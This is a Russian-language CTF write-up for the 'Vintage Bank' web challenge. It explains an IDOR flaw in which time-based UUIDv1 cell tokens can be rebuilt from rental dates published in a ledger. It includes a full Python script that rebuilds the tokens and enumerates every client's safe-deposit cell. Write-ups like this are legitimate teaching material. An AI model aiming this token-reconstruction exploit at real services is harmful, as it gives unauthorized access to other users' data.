# Writeup — Vintage Bank (SolarCTF)

**Флаг:** `SOLARCTF{idor_s4fe_d3posit_b0x}`
**Категория:** web · **Дата:** 2026-10-17 · **Цель:** https://vintage-bank.solarctf.ru

## Легенда
«Древнейший банк для самых богатых» — текстовый квест: арендуй ячейку, получи карту с UUID, смотри содержимое по токену.

## Разведка
Вся логика клиента в `static/js/script.js`, API из трёх ручек:
- `POST api/rent` → `{"token": "<uuid>", "cell": N}` — аренда ячейки;
- `GET api/cell/<token>` → `{"flag": ..., "cell": ..., "owner": ...}`;
- `GET api/ledger` → реестр из 26 клиентов: `{ord, name, date, cell}` — **без токенов**.

Валидный токен отличим от невалидного: у существующей ячейки `cell != null` (несуществующий токен возвращает `cell: null`, HTTP 200) — готовый оракул.

## Уязвимость: предсказуемые UUIDv1
Арендованные токены вида `d741df00-ca0d-11f1-9a2b-0242ac110002` — **UUID версии 1** (time-based). Наблюдения по серии аренд:
- `clock_seq` = `9a2b` — **константа** (генератор не перегенерирует её на каждый вызов);
- `node` = `0242ac110002` — MAC контейнера Docker (172.17.0.2), константа;
- timestamp имеет **гранулярность 1 секунда**: два запроса в пределах одной секунды вернули **идентичные** токены (кастомный генератор: `ticks = unix_second * 10^7`, субсекундная часть нулевая).

Следствие: UUID однозначно определяется секундой выдачи. А `api/ledger` публикует точные даты аренды всех клиентов — значит, их токены восстанавливаются без перебора:

```
time_low/time_mid/time_hi = unix_second + 12219292800 (сек), version 1
clock_seq = 9a2b, node = 0242ac110002
```

## Эксплуатация
1. Арендуем свою ячейку и сверяем модель: токен, вычисленный из текущей unix-секунды, совпал с выданным — модель подтверждена.
2. Для каждой записи ledger парсим `date` (`ДД.ММ.ГГГГ ЧЧ:ММ:СС`, наивный UTC) и строим токен.
3. `GET api/cell/<token>` по всем 26 кандидатам → 23 токена существуют.

Ячейка №6 (клиент ord 13, «Смирнова Е.», аренда 23.04.2026 12:22:34), токен `1b48a100-3f0f-11f1-9a2b-0242ac110002`:

```json
{"cell": 6, "owner": "Смирнова Е.", "flag": "SOLARCTF{idor_s4fe_d3posit_b0x}"}
```

Само название флага (`idor_s4fe_d3posit_b0x`) подтверждает класс уязвимости: **IDOR** — доступ к чужим сейфовым ячейкам по угаданному идентификатору.

## Воспроизведение

Скрипт (stdlib-only): арендует контрольную ячейку, сверяет модель токена, восстанавливает токены всех клиентов ledger и печатает флаг.

```python
# -*- coding: utf-8 -*-
# Vintage Bank — verified solution.
# IDOR via predictable UUIDv1 tokens:
#   1) rent own cell -> observe token model (uuid1, 1s granularity, const clock_seq/node)
#   2) ledger leaks rent dates of all clients -> rebuild their tokens exactly
#   3) GET api/cell/<token> -> one cell holds the flag
import json, re, sys, time, urllib.request
from concurrent.futures import ThreadPoolExecutor

BASE = "https://vintage-bank.solarctf.ru"
CLOCK_SEQ_RAW = 0x9a2b          # constant clock_seq observed in rent tokens (raw field)
NODE = 0x0242ac110002           # constant node (Docker MAC 02:42:ac:11:00:02)
UUID_EPOCH_OFFSET = 12219292800  # seconds between 1582-10-15 and 1970-01-01

def http(path, method="GET"):
    req = urllib.request.Request(BASE + path, data=(b"" if method == "POST" else None), method=method,
                                 headers={"User-Agent": "solve/1"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read().decode())

def token_for_unix(unix_seconds):
    t = (int(unix_seconds) + UUID_EPOCH_OFFSET) * 10_000_000  # 100ns ticks, subsecond = 0
    return "%08x-%04x-%04x-%04x-%012x" % (t & 0xffffffff, (t >> 32) & 0xffff,
                                          ((t >> 48) & 0x0fff) | 0x1000, CLOCK_SEQ_RAW, NODE)

def main():
    # sanity: token model must reproduce freshly issued tokens (tolerate clock skew of a few seconds)
    mine = http("/api/rent", method="POST")
    now = int(time.time())
    if mine["token"] not in {token_for_unix(now + d) for d in range(-3, 4)}:
        print("[!] token model mismatch — generator constants may have changed", file=sys.stderr)
    print("[*] rented cell", mine["cell"], "token", mine["token"])

    ledger = http("/api/ledger")
    cands = []
    for e in ledger:
        dt = time.mktime(time.strptime(e["date"], "%d.%m.%Y %H:%M:%S")) - time.timezone  # naive UTC
        cands.append((e, token_for_unix(dt)))

    def probe(item):
        e, tok = item
        try:
            return e, tok, http("/api/cell/" + tok)
        except Exception:
            return e, tok, None

    flags = []
    with ThreadPoolExecutor(max_workers=24) as ex:
        for e, tok, data in ex.map(probe, cands):
            if data and data.get("cell") is not None:
                mark = " <-- FLAG" if data.get("flag") else ""
                print(f"[+] ord={e['ord']:>2} cell={data['cell']:>2} owner={data.get('owner')!r} "
                      f"token={tok}{mark}")
                if data.get("flag"):
                    flags.append(data["flag"])
    print("\n[*] FLAGS:", flags or "none found")

if __name__ == "__main__":
    main()
```

Проверено 2026-10-17.

## Почему это сработало / выводы
- UUIDv1 не секретен по построению: время + MAC + clock_seq — всё либо наблюдаемо, либо перечислено в самом приложении.
- Публикация дат операций (ledger) в комбинации с time-based идентификаторами ресурсов = детерминированная утечка всех идентификаторов.
- Дополнительно: повторная аренда в ту же секунду выдаёт **дубликат** токена — ещё один признак самодельного генератора.
